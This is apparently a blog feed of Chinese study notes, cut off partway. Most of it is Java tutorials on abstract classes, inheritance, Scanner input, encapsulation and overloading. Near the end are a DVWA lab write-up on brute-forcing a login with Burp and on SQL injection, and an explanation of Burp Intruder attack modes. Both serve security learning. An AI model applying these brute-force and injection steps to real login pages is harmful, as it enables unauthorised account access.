        <content type="html"><![CDATA[<h3 id="由来"><a href="#由来" class="headerlink" title="由来"></a>由来</h3><p>父类中的方法，被它的子类们重写，子类各自的实现都不尽相同。那么父类的方法声明和方法主体，只有声明还有意义，而方法主体则没有存在的意义了。我们把没有方法主体的方法称为抽象方法。Java 语法规定，包含抽象方法的类就是抽象类。</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li>抽象方法：没有方法体的方法</li><li>抽象类：包含抽象方法的类</li></ul><h3 id="使用格式"><a href="#使用格式" class="headerlink" title="使用格式"></a>使用格式</h3><h4 id="抽象方法"><a href="#抽象方法" class="headerlink" title="抽象方法"></a>抽象方法</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java">修饰符 <span class="token keyword">abstract</span> 返回值类型 方法名<span class="token punctuation">(</span>参数列表<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><p><strong>如果一个类包含抽象方法，那么该类必须是抽象类</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">abstract</span> <span class="token keyword">class</span> 类名 <span class="token punctuation">&#123;</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="抽象的使用"><a href="#抽象的使用" class="headerlink" title="抽象的使用"></a>抽象的使用</h3><p>继承抽象类的子类必须重写父类所有的抽象方法。否则，该子类也必须声明为抽象类。最终，必须有子类实现该父类的抽象方法，否则，从最初的父类到最终的子类都不能创建对象，失去意义。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">abstract</span> <span class="token keyword">class</span>  <span class="token class-name">Animal</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 这是一个抽象方法，代表吃东西，但是具体吃什么（大括号的内容）不确定。</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token keyword">extends</span> <span class="token class-name">Animal</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"猫吃鱼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CatTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Animal animal = new Animal(); // 错误写法！不能直接创建抽象类对象</span>        <span class="token class-name">Cat</span> cat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cat<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时的方法重写，是子类对父类抽象方法的完成实现，我们将这种方法重写的操作，也叫做实现方法。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol><li><p>抽象类不能创建对象，如果创建，编译无法通过而报错。只能创建其非抽象子类的对象</p></li><li><p>抽象类中，可以有构造方法，是供子类创建对象时，初始化父类成员使用的。</p><blockquote><p>子类的构造方法中，有默认的 super()，需要访问父类构造方法。</p></blockquote></li><li><p>抽象类中，不一定包含抽象方法，但是有抽象方法的类必定是抽象类。</p></li><li><p>抽象类的子类，必须重写抽象父类中所有的抽象方法，否则，编译无法通过而报错。除非该子类也是抽象类。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>继承</title>
      <link href="/2021/09/20/%E7%BB%A7%E6%89%BF/"/>
      <url>/2021/09/20/%E7%BB%A7%E6%89%BF/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>多个类中存在相同属性和行为时，将这些内容抽取到单独一个类中，那么多个类无需再定义这些属性和行为，只要继承那一个类即可。</p><p>其中，多个类可以称为子类，单独那一个类称为父类、超类或者基类。继承描述的是事物之间的所属关系，这种关系是：<strong>is-a</strong>的关系。父类更通用，子类更具体。我们通过继承，可以使多种事物之间形成一种关系体系。</p><blockquote><p>子类继承父类的<strong>属性</strong>和<strong>行为</strong>，使得子类对象具有与父类相同的属性、相同的行为。子类可以直接访问父类中的<strong>非私有</strong>的属性和行为。</p></blockquote><h3 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h3><ul><li>提高代码复用性</li><li>类与类之间产生了关系，是多态的前提</li></ul><h3 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h3><p>使用<code>extends</code>关键字，声明一个子类继承另一个父类，格式如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">calss <span class="token class-name">Fu</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Zi</span> <span class="token keyword">extends</span> <span class="token class-name">Fu</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li><p>java 只支持单继承，不支持多继承</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//一个类只能有一个父类，不可以有多个父类。</span><span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token keyword">extends</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token comment">// ok</span><span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token keyword">extends</span> <span class="token class-name">A</span>，<span class="token class-name">B</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">//error</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>java 支持多层继承</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">extends</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token keyword">extends</span> <span class="token class-name">B</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>子类和父类是一种相对的概念</p></li></ul><h3 id="继承后的特点"><a href="#继承后的特点" class="headerlink" title="继承后的特点"></a>继承后的特点</h3><h4 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h4><ul><li><p>成员变量不重名时，访问不受影响，子类可以访问父类中的非私有成员变量</p></li><li><p>成员变量重名，需要使用<code>super</code>关键字，来访问被隐藏的父类成员变量（类似于 this）</p><p>格式：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">super</span><span class="token punctuation">.</span>父类成员变量名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><blockquote><p>通常编码时，我们遵循封装的原则，使用 private 修饰成员变量，那么如何访问父类的私有成员变量呢？</p><p>可以通过父类中提供的公共的 getXxx()和 setXxx()方法</p></blockquote><h4 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h4><ul><li><p>成员方法不重名，若子类中存在就执行子类中的方法，没有则向上调用父类中的方法</p></li><li><p>成员方法重名——重写（Override)</p><ul><li><p>子类中出现与父类一模一样的方法时（返回值类型，方法名，参数列表都相同），会出现覆盖效果，也称为重写或复写</p></li><li><p>应用： 子类可以根据需要，定义特定于自己的行为。既沿袭了父类的功能名称，又根据子类的需要重新实现父类方法，从而进行扩展增强。</p></li><li><p>注意：</p><ol><li>子类方法覆盖父类方法，必须要保证权限大于等于父类权限。</li><li>子类方法覆盖父类方法，返回值类型、函数名和参数列表都要一模一样。</li></ol></li><li><p><code>@Override</code>：写在方法前面，用来检测是不是有效的方法重写。如果不是有效重写，则编译出错</p><p>这个注解即使不写，只要满足要求，也是正确的方法重写</p></li></ul></li></ul><blockquote><p>局部变量&#x2F;方法：直接写成员变量名</p><p>本类成员变量&#x2F;方法：this.成员变量名父类</p><p>成员变量&#x2F;方法：super.成员变量名</p></blockquote><h4 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h4><ul><li><p>构造方法的名字是与类名一致的。所以子类是无法继承父类构造方法的。</p></li><li><p>构造方法的作用是初始化成员变量的。所以子类的初始化过程中，必须先执行父类的初始化动作。子类的构造方法中默认有一个<code>super()</code>，表示调用父类的构造方法，父类成员变量初始化后，才可以给子类使用。</p><blockquote><p>子类构造必须调用父类构造方法，不写则默认赠送<code>super()</code></p><p>super 只能有一个，且必须在方法第一行</p></blockquote></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在使用Java Scanner类进行输入时，换行符的问题</title>
      <link href="/2021/09/17/%E5%9C%A8%E4%BD%BF%E7%94%A8Java-Scanner%E7%B1%BB%E8%BF%9B%E8%A1%8C%E8%BE%93%E5%85%A5%E6%97%B6%EF%BC%8C%E6%8D%A2%E8%A1%8C%E7%AC%A6%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2021/09/17/%E5%9C%A8%E4%BD%BF%E7%94%A8Java-Scanner%E7%B1%BB%E8%BF%9B%E8%A1%8C%E8%BE%93%E5%85%A5%E6%97%B6%EF%BC%8C%E6%8D%A2%E8%A1%8C%E7%AC%A6%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="关于使用-Java-Scanner-类进行输入时，换行符的问题"><a href="#关于使用-Java-Scanner-类进行输入时，换行符的问题" class="headerlink" title="关于使用 Java Scanner 类进行输入时，换行符的问题"></a>关于使用 Java Scanner 类进行输入时，换行符的问题</h3><p><strong>问题：</strong>在使用<code>Scanner.nextInt()</code>或<code>Scanner.next()</code>时，会读取到”\n”之前结束，这个”\n”会被下一个扫描器接收，如<code>Scanner.nextLine ()</code>，导致直接跳过此步；</p><p><strong>解决办法：</strong>在下一步输入之前使用<code>Scanner.nextLine();</code>吸收多余的”\n”</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> num1 <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> num2 <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//正确</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>num2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> num <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> str <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//出错</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以上述代码为例，nextInt()输入 num 值，之后用户输入换行符想要结束，可是 nextInt()方法并不会读取换行符，因此换行符被读取放到了下一个 nextLine()中，nextLine()读取换行符，直接输入结束，因此 str 获得的值就是空<code>“”</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> num <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> str <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//正确</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str1 <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> str2 <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//出错</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str1 <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> str2 <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//正确</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>附：next()与 nextLine()的区别</strong></p><ul><li>next()方法在读取内容时，会过滤掉有效字符前面的无效字符，对输入有效字符之前遇到的空格键、Tab 键或 Enter 键等结束符，next()方法会自动将其过滤掉；只有在读取到有效字符之后，next()方法才将其后的空格键、Tab 键或 Enter 键等视为结束符；所以 next()方法不能得到带空格的字符串。</li><li><code>nextLine()</code>方法字面上有扫描一整行的意思，它的结束符只能是 Enter 键，即 nextLine()方法返回的是 Enter 键之前没有被读取的所有字符，它是可以得到带空格的字符串的。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> problem </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>封装</title>
      <link href="/2021/08/11/%E5%B0%81%E8%A3%85/"/>
      <url>/2021/08/11/%E5%B0%81%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>面向对象编程语言是对客观世界的模拟，客观世界里成员变量都是隐藏在对象内部的，外界无法直接操作和修改。封装可以被认为是一个保护屏障，防止该类的代码和数据被其他类随意访问。要访问该类的数据，必须通过指定的方式。适当的封装可以让代码更容易理解与维护，也加强了代码的安全性。</p><h3 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h3><p>将属性隐藏起来，若需要访问某个属性，提供公共方法对其访问。</p><h3 id="封装的操作——private-关键字"><a href="#封装的操作——private-关键字" class="headerlink" title="封装的操作——private 关键字"></a>封装的操作——private 关键字</h3><h4 id="private-的含义"><a href="#private-的含义" class="headerlink" title="private 的含义"></a>private 的含义</h4><ol><li>private 是一个权限修饰符，代表最小权限。</li><li>可以修饰成员变量和成员方法。</li><li>被 private 修饰后的成员变量和成员方法，只在本类中才能访问。</li></ol><h4 id="private-的使用格式"><a href="#private-的使用格式" class="headerlink" title="private 的使用格式"></a>private 的使用格式</h4><ol><li>使用 private 修饰成员变量</li><li>提供 getXxx&#x2F;setXxx 方法，可以访问成员变量</li></ol><h3 id="this-关键字"><a href="#this-关键字" class="headerlink" title="this 关键字"></a>this 关键字</h3><h4 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h4><ul><li>this 代表所在类的当前对象的引用（地址值），即对象自己的引用</li><li><strong>方法被哪个对象调用，方法中的 this 就代表那个对象。即谁在调用，this 就代表谁</strong></li></ul><h4 id="使用格式"><a href="#使用格式" class="headerlink" title="使用格式"></a>使用格式</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span>成员变量名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//使用this修饰方法中的变量，解决成员变量被隐藏的问题</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//name=name;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//age=age;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token operator">=</span>age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p>当一个对象被创建时候，构造方法用来初始化该对象，给对象的成员变量赋初始值。</p><blockquote><p>无论是否自定义构造方法，所有的类都有构造方法，因为 Java 自动提供了一个无参数构造方法，一旦自己定义了构造方法，Java 自动提供的默认无参数构造方法就会失效。</p></blockquote><h4 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java">修饰符 构造方法名<span class="token punctuation">(</span>参数列表<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//方法体</span><span class="token punctuation">&#125;</span><span class="token comment">//构造方法名需要与所在的类名相同</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol><li>如果你不提供构造方法，系统会给出无参数构造方法。</li><li>如果你提供了构造方法，系统将不再提供无参数构造方法。</li><li>构造方法是可以重载的，既可以定义参数，也可以不定义参数。</li></ol><h3 id="标准代码——JavaBean"><a href="#标准代码——JavaBean" class="headerlink" title="标准代码——JavaBean"></a>标准代码——JavaBean</h3><p><code>JavaBean</code>是 Java 语言编写类的一种标准规范。</p><ol><li>类必须是具体的和公共的</li><li>具有无参数的构造方法</li><li>所有的成员变量都要使用 private 关键字修饰</li><li>提供用来操作成员变量的<code>set</code>和<code>get</code>方法</li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成员变量与局部变量</title>
      <link href="/2021/08/10/%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/"/>
      <url>/2021/08/10/%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h2><ul><li><p>定义的位置不一样</p><ul><li>局部变量：在方法的内部</li><li>成员变量：在方法的外部，直接写在类当中</li></ul></li><li><p>作用范围不一样</p><ul><li>局部变量：只有方法中才可以使用，出了方法就不能用</li><li>成员变量：整个类全都可以通用</li></ul></li><li><p>默认值不一样</p><ul><li>局部变量没有默认值，想使用必须手动赋值</li><li>成员变量有默认值</li></ul></li><li><p>内存位置不一样</p><ul><li>局部变量位于栈内存</li><li>成员变量位于堆内存</li></ul></li><li><p>生命周期不同</p><ul><li>局部变量随着方法进栈诞生，随着方法出栈消失</li><li>成员变量随着对象创建诞生，随着对象被回收消失</li></ul></li></ul><h3 id="成员变量的默认值"><a href="#成员变量的默认值" class="headerlink" title="成员变量的默认值"></a>成员变量的默认值</h3><table><thead><tr><th></th><th>数据类型</th><th>默认值</th></tr></thead><tbody><tr><td>基本类型</td><td>整型(byte,short,int,long)</td><td>0</td></tr><tr><td></td><td>浮点型(float,double)</td><td>0.0</td></tr><tr><td></td><td>字符型(char)</td><td>‘\u0000’</td></tr><tr><td></td><td>布尔型(boolean)</td><td>false</td></tr><tr><td>引用类型</td><td>数组，类，接口</td><td>null</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象概述</title>
      <link href="/2021/08/10/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
      <url>/2021/08/10/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Java语言是一种面向对象的程序设计语言，而面向对象思想是一种程序设计思想，我们在面向对象思想的指引下，使用Java语言去设计、开发计算机程序。这里的对象泛指现实中一切事物，每种事物都具备自己的属性和行为。面向对象思想就是在计算机程序设计过程中，参照现实中事物，将事物的属性特征、行为特征抽象出来，描述成计算机事件的设计思想。它区别于面向过程思想，强调的是通过调用对象的行为来实现功能，而不是自己一步一步的去操作实现。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>面向对象思想是一种更符合我们思考习惯的思想，它可以将复杂的事情简单化，并将我们从执行者变成了指挥者。面向对象的语言中，包含了三大基本特征，即封装、继承和多态。</p><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>是一组相关属性和行为的集合。可以看成是一类事物的模板，使用事物的属性特征和行为特征来描述该类事物。<br>现实中，描述一类事物：  </p><ul><li>属性：就是该事物的状态信息。</li><li>行为：就是该事物能够做什么。</li></ul><p>举例：小猫。  </p><ul><li>属性：名字、体重、年龄、颜色。行</li><li>为：走、跑、叫。</li></ul><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>是一类事物的具体体现。对象是类的一个实例，必然具备该类事物的属性和行为。</p><p>现实中，一类事物的一个实例。</p><p>举例：一只小猫。  </p><ul><li>属性：tom、5kg、2years、yellow。</li><li>行为：溜墙根走、蹦跶的跑、喵喵叫。</li></ul><h3 id="类和对象的关系"><a href="#类和对象的关系" class="headerlink" title="类和对象的关系"></a>类和对象的关系</h3><ul><li>类是对一类事物的描述，是抽象的。</li><li>对象是一类事物的实例，是具体的。</li><li><strong>类是创建对象的模板，对象是类的实例。</strong></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>方法重载</title>
      <link href="/2021/08/08/%E6%96%B9%E6%B3%95%E9%87%8D%E8%BD%BD/"/>
      <url>/2021/08/08/%E6%96%B9%E6%B3%95%E9%87%8D%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h1><p>方法重载(Overload)就是指在一个类中，存在一个以上的同名方法，这些方法的参数列表不同</p><blockquote><p>与修饰符和返回值类型无关</p></blockquote><h3 id="参数列表"><a href="#参数列表" class="headerlink" title="参数列表"></a>参数列表</h3><ul><li>参数个数</li><li>参数数据类型</li><li>参数顺序</li></ul><h3 id="重载方法的调用"><a href="#重载方法的调用" class="headerlink" title="重载方法的调用"></a>重载方法的调用</h3><p>jvm通过方法的参数列表，自动选择调用不同的方法</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-Brute Force</title>
      <link href="/2021/04/10/DVWA-Brute-Force/"/>
      <url>/2021/04/10/DVWA-Brute-Force/</url>
      
        <content type="html"><![CDATA[<h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p><strong>爆破</strong></p><p>burp抓包<img src="/2021/04/10/DVWA-Brute-Force/1.png" alt="1"></p><p>在每个位置导入字典<img src="/2021/04/10/DVWA-Brute-Force/2.png" alt="2"></p><p>开始爆破</p><p><img src="/2021/04/10/DVWA-Brute-Force/3.png" alt="3"></p><p><strong>sql注入</strong></p><p><img src="/2021/04/10/DVWA-Brute-Force/4.png"></p><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>对用户名和密码都进行了转义操作,无法进行sql注入<br>仍然可以用low级别的方法爆破</p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burp爆破模块</title>
      <link href="/2021/04/10/burp%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/"/>
      <url>/2021/04/10/burp%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<p><strong>Sniper</strong><br>这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p><p>假设设置了两个payload位置,payload组为”a,b”,则会形成以下组合</p><table><thead><tr><th>NO.</th><th>位置1</th><th>位置2</th></tr></thead><tbody><tr><td>1</td><td>a</td><td></td></tr><tr><td>2</td><td>b</td><td></td></tr><tr><td>3</td><td></td><td>a</td></tr><tr><td>4</td><td></td><td>b</td></tr></tbody></table><p><strong>Battering ram</strong><br>这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p><table><thead><tr><th>NO.</th><th>位置1</th><th>位置2</th></tr></thead><tbody><tr><td>1</td><td>a</td><td>a</td></tr><tr><td>2</td><td>b</td><td>b</td></tr></tbody></table><p><strong>Pitchfork</strong><br>这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p><p>假设设置了两个payload位置,payload1为”a,b”,payload2为”c,d”则会形成以下组合</p><table><thead><tr><th>NO.</th><th>位置1</th><th>位置2</th></tr></thead><tbody><tr><td>1</td><td>a</td><td>c</td></tr><tr><td>2</td><td>b</td><td>d</td></tr></tbody></table><p><strong>Cluster 